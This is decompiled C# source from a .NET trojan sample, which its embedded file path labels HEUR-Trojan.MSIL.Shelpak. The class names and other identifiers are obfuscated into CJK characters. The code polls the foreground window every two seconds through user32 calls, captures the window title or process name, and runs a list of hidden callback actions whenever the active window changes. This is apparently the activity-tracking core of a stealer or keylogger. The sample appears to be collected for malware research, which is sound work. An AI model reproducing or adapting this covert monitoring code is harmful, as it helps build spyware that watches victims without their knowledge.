// Decompiled with JetBrains decompiler
// Type: 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山.斤耒聿田尢爿尢舌一音文手舟虫
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using 心羽比鹿黃儿冖几立艮斤;

namespace 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山
{
  internal sealed class 斤耒聿田尢爿尢舌一音文手舟虫
  {
    public static string 非牙弋弓二方鳥片至比虫;
    public static Thread 寸山牛豕手白小比广缶刀韋言 = new Thread(new ThreadStart(斤耒聿田尢爿尢舌一音文手舟虫.齊丿囗文瓜隹毋夊彳儿冖辰彐羊));
    private static List<Action> 月支攴木干巛木夊鼓爻黹幺几 = new List<Action>()
    {
      new Action(二衣皮釆匕气入一日口片夕戶比.舌手月身耳尢木食屮牛糸水廾),
      new Action(力厶气气儿穴匸子巾鹵鼓魚肉手.毋文山生小至矢斤文疒舌玄竹耒)
    };

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr 歹聿毛山凵革广卜尢龜日();

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint 冫鹵谷言土水木冂瓦月(IntPtr 士八女羽革攴弓田几力方耳, out uint 黃无水牙禸斗爪月夊耒);

    private static string 疒示爻廴己韋釆廾首土斤弋石()
    {
      try
      {
        uint 黃无水牙禸斗爪月夊耒;
        int num = (int) 斤耒聿田尢爿尢舌一音文手舟虫.冫鹵谷言土水木冂瓦月(斤耒聿田尢爿尢舌一音文手舟虫.歹聿毛山凵革广卜尢龜日(), out 黃无水牙禸斗爪月夊耒);
        Process processById = Process.GetProcessById((int) 黃无水牙禸斗爪月夊耒);
        string str = processById.MainWindowTitle;
        if (string.IsNullOrWhiteSpace(str))
          str = processById.ProcessName;
        return str;
      }
      catch (Exception ex)
      {
        return "Unknown";
      }
    }

    private static void 齊丿囗文瓜隹毋夊彳儿冖辰彐羊()
    {
      鬼土龍豸子戈宀歹舛戈首靑入廾.寸山牛豕手白小比广缶刀韋言.Start();
      string str = "";
label_1:
      do
      {
        Thread.Sleep(2000);
        斤耒聿田尢爿尢舌一音文手舟虫.非牙弋弓二方鳥片至比虫 = 斤耒聿田尢爿尢舌一音文手舟虫.疒示爻廴己韋釆廾首土斤弋石();
      }
      while (!(斤耒聿田尢爿尢舌一音文手舟虫.非牙弋弓二方鳥片至比虫 != str));
      str = 斤耒聿田尢爿尢舌一音文手舟虫.非牙弋弓二方鳥片至比虫;
      using (List<Action>.Enumerator enumerator = 斤耒聿田尢爿尢舌一音文手舟虫.月支攴木干巛木夊鼓爻黹幺几.GetEnumerator())
      {
        while (enumerator.MoveNext())
          enumerator.Current();
        goto label_1;
      }
    }
  }
}
